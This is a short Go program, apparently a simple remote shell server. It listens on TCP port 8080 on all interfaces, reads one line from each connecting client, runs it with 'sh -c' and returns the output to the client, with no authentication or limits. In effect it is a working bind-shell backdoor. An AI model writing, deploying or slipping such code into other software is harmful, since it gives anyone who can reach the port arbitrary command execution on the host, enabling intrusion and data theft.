package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Ошибка:", err)
		return
	}
	defer listener.Close()

	fmt.Println("server is listening on port 8080...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Ошибка подключения:", err)
			continue
		}

		go handleClient(conn)
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	fmt.Println("Connected client:", conn.RemoteAddr())

	r := bufio.NewReader(conn)
	command, err := r.ReadString('\n')
	if err != nil {
		fmt.Println("Error reading command:", err)
		return
	}

	cmd := exec.Command("sh", "-c", string(command))
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Run(); err != nil {
		fmt.Fprintln(conn, "Error running command:", err)
		return
	}
}
